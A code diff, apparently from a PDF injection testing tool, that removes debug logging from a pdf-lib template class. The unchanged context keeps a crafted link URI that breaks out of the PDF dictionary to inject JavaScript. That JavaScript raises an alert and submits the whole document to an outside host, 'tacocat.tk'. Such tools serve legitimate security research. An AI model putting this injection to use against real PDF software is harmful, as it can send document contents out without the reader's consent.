@@ -6,9 +6,7 @@ class PDFkit_template{
 
 	async js_submitForm(out_name='js_submitForm', direction){
 		const PDFDocument = require("pdf-lib").PDFDocument, rgb = require("pdf-lib").rgb, PDFString = require("pdf-lib").PDFString, PDFName = require("pdf-lib").PDFName, StandardFonts = require("pdf-lib").StandardFonts
-		console.log("gna fail up coming await")
 		const pdfDoc = await PDFDocument.create()
-		console.log("yeet")
 		const timesRomanFont = await pdfDoc.embedFont(StandardFonts.TimesRoman)
 		const page = pdfDoc.addPage()
 		const { width, height } = page.getSize()
@@ -29,7 +27,6 @@ class PDFkit_template{
 			A: {
 				Type: 'Action',
 				S: 'URI',
-				// URI: PDFString.of(`injection)`),
 				URI: PDFString.of(`/blah)>>/A<</S/JavaScript/JS(app.alert(1);
 				this.submitForm({
 				cURL: 'http://tacocat.tk',cSubmitAs: 'PDF'}))
@@ -42,7 +39,6 @@ class PDFkit_template{
 		const fs = require('fs')
 		fs.writeFile("js-submitForm.pdf", new Buffer(pdfBytes), function(err){
 			if(err) {
-				// console.log(err);
 				return [out_name, -1 ];
 			}
 		});
